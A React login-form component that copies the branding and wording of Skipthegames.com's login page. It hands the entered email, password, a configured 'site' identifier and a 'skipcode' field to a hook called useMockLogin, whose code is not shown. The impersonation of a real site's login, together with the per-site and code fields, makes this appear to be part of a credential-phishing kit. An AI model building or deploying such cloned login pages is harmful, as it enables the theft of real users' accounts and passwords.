import { Field, Form, Formik } from "formik";
import useMockLogin from "../hooks/useMockLogin";
import { site } from "../config";

function LoginForm() {
  const initialvalues = {
    email: "",
    password: "",
  };

  const { login } = useMockLogin();

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);

    // console.log(submitValues);
  };

  return (
    <div className="container px-4 lg:px-0">
      <div className="pt-[14px] lg:pt-[18px] py-[38px] grid grid-cols-1 lg:grid-cols-2 gap-5 lg:gap-[150px]">
        <div className="">
          <h3 className="text-[22px] lg:text-[27px] text-custom-gray2">
            Log in to your account
          </h3>

          <div className="mt-2">
            <Formik
              initialValues={initialvalues}
              // validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-5">
                  <Field
                    className="w-full text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                    placeholder="Your email"
                    name="email"
                    type="email"
                    required
                  />

                  <Field
                    className="w-full text-sm  px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />

                  <button
                    type="submit"
                    className="w-full bg-custom-cyan hover:bg-custom-cyan2 py-[14px] text-white transition duration-300 rounded"
                  >
                    Log in
                  </button>
                </Form>
              )}
            </Formik>
          </div>

          <p className="mt-5 text-[9px] text-custom-gray2 font-semibold">
            By clicking "Log in", you accept
            <span className="text-custom-cyan hover:text-custom-cyan2 cursor-pointer">
              {" "}
              Skipthegames.com's Terms and Conditions of Use
            </span>
          </p>

          <p className="text-sm text-custom-rose underline cursor-pointer">
            Forgot your password?
          </p>
        </div>

        <div className="lg:ml-[120px]">
          <h3 className="text-[22px] lg:text-[27px] text-custom-gray2">
            First time here?
          </h3>
          <p className="mt-[14px] text-custom-rose underline cursor-pointer">
            Post your first ad
          </p>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
